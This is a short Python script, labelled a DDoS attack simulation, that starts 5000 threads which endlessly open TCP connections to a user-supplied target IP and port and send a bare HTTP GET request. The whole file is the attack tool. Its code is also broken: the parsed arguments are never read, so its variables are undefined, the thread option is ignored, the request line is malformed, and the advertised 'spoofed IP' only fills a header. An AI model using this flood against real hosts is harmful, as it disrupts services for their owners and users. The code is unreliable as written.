import threading
import socket
import argparse

# Set up argument parsing, get IP addresses and port numbers from the CLI as the script runs
parser = argparse.ArgumentParser(description="DDoS attack simulation script.")
parser.add_argument("target", type=str, help="Target IP address")
parser.add_argument("port", type=int, help="Target port")
parser.add_argument("spoofedIP", type=str, help="Spoofed source IP address to include in the request headers")
parser.add_argument("--threads", type=int, default=100, help="Number of threads to launch (default: 100)")

# connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + myIP + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

#        global connected
#        connected += 1
#        print(connected)

for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()